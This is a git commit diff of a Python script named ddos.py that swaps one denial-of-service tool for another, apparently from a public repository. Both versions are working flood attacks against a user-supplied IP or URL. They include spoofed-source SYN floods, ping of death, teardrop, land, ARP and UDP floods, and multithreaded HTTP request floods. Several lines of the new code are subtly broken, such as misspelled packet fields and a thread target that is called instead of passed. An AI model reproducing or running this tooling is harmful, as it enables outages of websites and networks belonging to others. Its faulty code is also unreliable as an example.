b3274c9e8062bfbf1cd3337fabf9329d9c1987f6
dhungx <139793488+dhungx@users.noreply.github.com>
2024-08-11 12:46:59 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,185 +1,224 @@
-import os
+from scapy.all import *
+import socket
 import threading
-import time
+import random
+import pyuseragents
 import requests
-from urllib.parse import urlparse
-from colorama import Fore, Style
-from socket import *
-from random import randrange, choice
-import ssl
-from struct import pack
-import warnings
+from rainbowtext import text as rain
+import pyfiglet , colorama
 
-# Tắt cảnh báo SSL
-warnings.filterwarnings("ignore", category=UserWarning, module='requests')
+rd = colorama.Fore.RED
+cv = colorama.Fore.WHITE
+bl = colorama.Fore.BLUE
+gn = colorama.Fore.GREEN
+yl = colorama.Fore.YELLOW
+mag = colorama.Fore.MAGENTA
+cy = colorama.Fore.CYAN
+lgn = colorama.Fore.LIGHTGREEN_EX
 
-print("""
-.-.   .-..-..----.  .---.  .----. .----.     .----..-----..-. .-..----. .-. .---.  
- \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
-  \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
-   `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
-AuThor: __VIBOSS__
-Github: https://github.com/dhungx/ddos
+def banner():
+    figlet = pyfiglet.Figlet(font="script").renderText("Fox DDOSER")
+    return figlet
 
-ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC)
 
-HÃY CẨN THẬN TRƯỚC KHI SỬ DỤNG VÌ CÓ THỂ VIỆC BẠN SẮP LÀM LÀ MỘT ĐIỀU PHẠM PHÁP
-""" + Style.RESET_ALL)
 
-class DDoSAttack:
-    def __init__(self, target_url, threads):
-        self.target_url = target_url
-        self.threads = threads
-        self.attack_num = 0
-        parsed_url = urlparse(target_url)
-        self.target_domain = parsed_url.netloc
-        self.target_path = parsed_url.path if parsed_url.path else "/"
-        self.schema = parsed_url.scheme or 'http'
 
-    def start(self):
-        print(f"Starting attack on {self.target_url}")
-        for _ in range(self.threads):
-            thread = threading.Thread(target=self.run)
-            thread.daemon = True
-            thread.start()
-        while True:
-            time.sleep(1)
+def ping_of_death(ip_target):
+    i = 0
+    while True:
+        send(IP(dst=ip_target , ttl=132 , id=1111)/ICMP()/(b"Sdadad"*8192) , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def syn_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target,id=1111,ttl=99)
+        tcp = TCP(sport=RandShort() , dport=80 ,seq=12345,ack=1000,windows=1000, flags="S")
+        data = b"MRadikal" * 8192
+        send(ip / tcp / data , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def malformed_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target , ihl=2 , version=3 , ttl=52 , id=112)
+        icmp = ICMP()
+        send(ip / icmp , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def land_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target,src=ip_target , id=78 , ttl=92)
+        tcp = TCP(sport=135,dport=135)
+        send(ip / tcp , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
 
-    def run(self):
-        while True:
-            self.ddos_requester()
-            self.syn_flood()
-            self.pyslow()
-            time.sleep(0.1)  # Wait a bit before restarting
-
-    def ddos_requester(self):
-        headers = {
-            'X-Forwarded-For': self.fake_ip(),
-            'User-Agent': choice(self.add_useragent()),
-            'Cache-Control': 'no-cache',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive'
-        }
+def nestea_attack(ip_target):
+    i =0 
+    while True:
+        ip = ip(dst=ip_target,id=42,flags="MF")
+        data = b"ZZZZ" * 1024
+        send(ip / UDP() / data , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def udp_attack(ip_target):
+    i=0
+    while True:
+        ip = IP(dst=ip_target)
+        udp = fuzz(UDP())
+        send(ip / udp , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def arp_attack(ip_target):
+    ether = Ether(dst="FF:FF:FF:FF:FF:FF")
+    arp = ARP(psrc=RandIP , pdst=ip_target)
+    srpflood(ether / arp)
         
-        try:
-            url = f"{self.schema}://{self.target_domain}{self.target_path}"
-            response = requests.get(url, headers=headers, timeout=5, verify=False)
-            self.attack_num += 1
-            print(Fore.GREEN + f"Requester packet sent! Attack count: {self.attack_num} - Response code: {response.status_code}" + Style.RESET_ALL)
-        except requests.RequestException as e:
-            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+def teardrop_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target,flags=0,proto=17,frags=3)
+        data = ("\x00" * 100)
+        ips = IP(dst=ip_target,flags="MF",proto=17,frag=18)
+        send(ip / data , verbose=0)
+        send(ips / data , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 2
 
-    def add_useragent(self):
-        return [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
-        ]
+def dns_spoofing(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target , ttl=12)
+        udp = UDP(sport=RandShort() , dport=53)
+        dns = DNS(qd=DNSQR(qname="secdev.org",qtype="A"))
+        send(ip / udp / dns)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
 
-    def syn_flood(self):
-        try:
-            ip_header = self.create_ip_header()
-            tcp_header = self.create_tcp_header()
-            packet = ip_header + tcp_header
 
-            sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
-            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            sock.sendto(packet, (self.target_domain, 0))
-            print(Fore.GREEN + "SYN Flood packet sent!" + Style.RESET_ALL)
-        except Exception as e:
-            print(Fore.RED + f"Error in SYN Flood: {e}" + Style.RESET_ALL)
 
-    def pyslow(self):
-        try:
-            sock = socket(AF_INET, SOCK_STREAM)
-            sock.connect((self.target_domain, 80))
-            sock.send(b'GET / HTTP/1.1\r\n')
-            time.sleep(1)
-            sock.close()
-            print(Fore.GREEN + "Pyslow connection established!" + Style.RESET_ALL)
-        except Exception as e:
-            print(Fore.RED + f"Error in Pyslow: {e}" + Style.RESET_ALL)
+def tcp_attack(ip_target):
+    sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+    sent = 0
+    port = 80
+    while True:
+        bytes = random._urandom(1769)
+        sock.sendto(bytes, (ip_target,port))
+        sent = sent + 1
+        port = port + 1
+        print ("Sent %s packet to %s on port:%s"%(sent,ip_target,port) , end="\r")
+        if port == 65534:
+            port = 1
 
-    def fake_ip(self):
-        return '.'.join(str(randrange(256)) for _ in range(4))
+def GET_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    i = 0
+    while True:
+        requests.get(url_target , headers=header)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
 
-    def create_ip_header(self):
-        ihl = 5
-        version = 4
-        tos = 0
-        tot = 40
-        id = 54321
-        frag_off = 0
-        ttl = 64
-        protocol = IPPROTO_TCP
-        check = 0
-        s_addr = inet_aton(self.fake_ip())
-        d_addr = inet_aton(self.target_domain)
-        ihl_version = (version << 4) + ihl
-        return pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
+def POST_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    i = 0
+    while True:
+        requests.post(url_target , headers=header)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
 
-    def create_tcp_header(self):
-        source = randrange(1024, 65535)
-        dest = 80
-        seq = 0
-        ack_seq = 0
-        doff = 5
-        tcp_flags = 2  # SYN flag
-        window = socket.htons(5840)
-        check = 0
-        urg_prt = 0
+def HEAD_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    i = 0
+    while True:
+        requests.head(url_target , headers=header)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def PUT_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    print ("Sent : %s\n" % str(i) , end="\r")
+    i = 0
+    while True:
+        requests.put(url_target , headers=header)
+        print ("Sent : %s\n" % str(i))
+        i = i + 1
+def OPTIONS_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    i = 0
+    while True:
+        requests.options(url_target , headers=header)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
 
-        offset_res = (doff << 4)
-        return pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
 
-def menu():
-    print(Style.BRIGHT + Fore.MAGENTA + """
-.-.   .-..-..----.  .---.  .----. .----.     .----..-----..-. .-..----. .-. .---.  
- \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
-  \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
-   `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
-AuThor: __VIBOSS__
-Github: https://github.com/dhungx/ddos
+print(rain(banner()))
+print (rain("""
+|==============================|
+|         Black Fox            |
+|       Security Team          |
+|  Author : Maximum Radikali   |
+|    DDOSER Layer 4 , Layer 7  |
+|==============================|
+"""))
+layer = input(cy + "[-] layer4\n[-] layer7\n\n ~ Select a layer to continue -> ")
 
-ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC)
-
-HÃY CẨN THẬN TRƯỚC KHI SỬ DỤNG VÌ CÓ THỂ VIỆC BẠN SẮP LÀM LÀ MỘT ĐIỀU PHẠM PHÁP
-""" + Style.RESET_ALL)
-    print(Style.BRIGHT + Fore.YELLOW + "[INFORMATION!]" + Fore.WHITE + " Press CTRL + C and ENTER to exit!!")
-    print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
-    print(Fore.WHITE + Style.BRIGHT + "Please choose from the following options...")
-    print(Fore.WHITE + Style.BRIGHT + "1. DDoS Requester [1]")
-    print(Fore.WHITE + Style.BRIGHT + "2. SYN Flood [2]")
-    print(Fore.WHITE + Style.BRIGHT + "3. Pyslow [3]")
-    print(Fore.WHITE + Style.BRIGHT + "4. Exit [4]")
-    print("Enter your choice...")
-
-    try:
-        choice = int(input())
-        if choice == 1:
-            attack_type = 'requester'
-        elif choice == 2:
-            attack_type = 'synflood'
-        elif choice == 3:
-            attack_type = 'pyslow'
-        elif choice == 4:
-            print("Exiting!")
-            return
-        else:
-            print("Please select a valid option!")
-            menu()
-            return
-        
-        threads = int(input("Enter number of threads: "))
-        target_url = input(Fore.RED + Style.BRIGHT + "Enter target URL: " + Style.RESET_ALL)
-
-        attack = DDoSAttack(target_url, threads)
-        attack.start()
-        
-    except ValueError:
-        print(Fore.RED + "Please enter a valid number." + Style.RESET_ALL)
-        menu()
-
-if __name__ == "__main__":
-    menu()
+if layer == "layer4":
+    ip_target = input(rd + "Please Enter Your Target IP - > ")
+    socketx = int(input(yl + "Please Enter Socket Worker ex : (10) - > "))
+    methods = input(gn + "[^] pod\n[^] syn\n[^] mfd (malformed Attack)\n[^] land\n[^] arp\n[^] nestea\n[^] dns\n[^] tear (Tear Drop Attack)\n[^] tcp\n[^] udp\n\n[~] Please Enter a method : ")
+    if methods == "pod":
+        for i in range(socketx):
+            threading.Thread(target=ping_of_death , args=(ip_target,)).start()
+    elif methods == "syn":
+        for i in range(socketx):
+            threading.Thread(target=syn_attack() , args=(ip_target,)).start()
+    elif methods == "mfd":
+        for i in range(socketx):
+            threading.Thread(target=malformed_attack , args=(ip_target,)).start()
+    elif methods == "land":
+        for i in range(socketx):
+            threading.Thread(target=land_attack , args=(ip_target,)).start()
+    elif methods == "arp":
+        print ("Attacking Start Now  .... !")
+        for i in range(socketx):
+            threading.Thread(target=arp_attack , args=(ip_target,)).start()
+    elif methods == "nestea":
+        for i in range(socketx):
+            threading.Thread(target=nestea_attack , args=(ip_target,)).start()
+    elif methods == "dns":
+        for i in range(socketx):
+            threading.Thread(target=dns_spoofing , args=(ip_target,)).start()
+    elif methods == "tear":
+        for i in range(socketx):
+            threading.Thread(target=teardrop_attack , args=(ip_target,)).start()
+    elif methods == "udp":
+        for i in range(socketx):
+            threading.Thread(target=udp_attack , args=(ip_target,)).start()
+    elif methods == "tcp":
+        for i in range(socketx):
+            threading.Thread(target=tcp_attack , args=(ip_target,)).start()
+if layer == "layer7":
+    url_target = input(bl + "[-] Please Enter Your Target URL : ")
+    worker = int(input(mag + "[=] Please Enter Your Thread Worker : "))
+    methods = input(lgn + "[$] GET\n[$] POST\n[$] PUT\n[$] HEAD\n[$] OPTIONS\n\n[*] Please Enter a Method : ")
+    if methods == "GET":
+        for x in range(worker):
+            threading.Thread(target=GET_attack,args=(url_target,)).start()
+    if methods == "POST":
+        for x in range(worker):
+            threading.Thread(target=POST_attack,args=(url_target,)).start()
+    if methods == "PUT":
+        for x in range(worker):
+            threading.Thread(target=PUT_attack,args=(url_target,)).start()
+    if methods == "HEAD":
+        for x in range(worker):
+            threading.Thread(target=HEAD_attack,args=(url_target,)).start()
+    if methods == "OPTIONS":
+        for x in range(worker):
+            threading.Thread(target=OPTIONS_attack,args=(url_target,)).start()
